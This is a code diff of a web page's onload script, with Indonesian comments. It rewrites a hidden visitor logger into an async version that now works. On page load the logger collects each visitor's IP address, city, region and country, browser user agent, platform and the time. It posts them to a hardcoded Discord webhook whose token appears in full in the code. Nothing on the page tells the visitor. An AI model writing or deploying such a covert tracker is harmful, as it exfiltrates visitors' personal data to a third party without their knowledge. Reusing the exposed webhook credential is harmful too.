@@ -116,54 +116,49 @@ window.onload = function() {
 
 	
   // Script Log HWID, Device info, User Agent, dan IP Log
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const userAgent = navigator.userAgent;
-        fetch('https://ipapi.co/json/')
-  .then(res => res.json())
-  .then(locData => {
-    const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
-    console.log(location); // bisa kamu ganti sesuai kebutuhan
-  });
-        const device = navigator.platform;
-        const date = new Date().toLocaleString();
-        
-        // Mengirim Pesan
-        const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
-        
-        // Embed Pesan
-        const embed = {
-          "embeds": [{
-            "title": "WEB ACCESS LOG",
-            "color": 15548997,
-            "fields": [
-              { "name": "IP Address", "value": ip, "inline": true },
-              { "name": "Device", "value": device, "inline": true },
-              { "name": "User Agent", "value": userAgent, "inline": false },
-              { "name": "Location", "value": location, "inline": true },
-              { "name": "Date", "value": date, "inline": true }
-            ],
-            "footer": {
-              "text": "HWID Log",
-            }
-          }]
-        };
 
-        // Mengirim Pesan
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(embed)
-        }).then(response => {
-          if (response.ok) {
-            console.log('Log successfully sent to Discord');
-          } else {
-            console.error('Error sending log to Discord');
-          }
-        });
-      });
-  }; 
-  
+    (async () => {
+  try {
+    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+    const locData = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+    const ip = ipData.ip;
+    const userAgent = navigator.userAgent;
+    const device = navigator.platform;
+    const date = new Date().toLocaleString();
+    const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
+
+    const embed = {
+      embeds: [{
+        title: "WEB ACCESS LOG",
+        color: 15548997,
+        fields: [
+          { name: "IP Address", value: ip, inline: true },
+          { name: "Device", value: device, inline: true },
+          { name: "User Agent", value: userAgent, inline: false },
+          { name: "Location", value: location, inline: true },
+          { name: "Date", value: date, inline: true }
+        ],
+        footer: { text: "HWID Log" }
+      }]
+    };
+
+    const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
+
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed)
+    });
+
+    if (response.ok) {
+      console.log('Log successfully sent to Discord');
+    } else {
+      console.error('Failed to send log', await response.text());
+    }
+  } catch (err) {
+    console.error('Logging failed:', err);
+  }
+})();
+
   // Script Log HWID, Device info, User Agent, dan IP Log
